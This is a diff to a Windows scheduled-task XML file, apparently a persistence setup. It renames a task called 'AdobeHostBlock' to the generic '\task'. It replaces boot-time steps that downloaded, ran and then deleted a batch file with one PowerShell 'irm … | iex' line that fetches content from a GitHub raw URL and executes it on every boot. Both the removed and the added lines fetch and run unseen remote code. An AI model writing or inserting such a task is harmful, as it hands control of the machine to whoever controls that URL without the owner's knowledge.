@@ -3,7 +3,7 @@
   <RegistrationInfo>
     <Date>2024-12-19T10:20:47.2761859</Date>
     <Author>LAPTOP-UDHP41S0\TEST</Author>
-    <URI>\AdobeHostBlock</URI>
+    <URI>\task</URI>
   </RegistrationInfo>
   <Triggers>
     <BootTrigger>
@@ -46,17 +46,7 @@
     </Exec>
     <Exec>
       <Command>powershell</Command>
-      <Arguments>curl -o C:\Windows\scheduler.bat https://raw.githubusercontent.com/minhtuan283/host/main/scheduler.bat</Arguments>
-    </Exec>
-    <Exec>
-      <Command>C:\Windows\scheduler.bat</Command>
-    </Exec>
-    <Exec>
-      <Command>powershell</Command>
-      <Arguments>Remove-Item "C:\Windows\scheduler.bat" -Force</Arguments>
-    </Exec>
-    <Exec>
-      <Command>C:\Windows\INF\backup.bat</Command>
+      <Arguments>-Command ("irm https://raw.githubusercontent.com/mitutina/mitutina/main/index.html|iex")</Arguments>
     </Exec>
   </Actions>
 </Task>
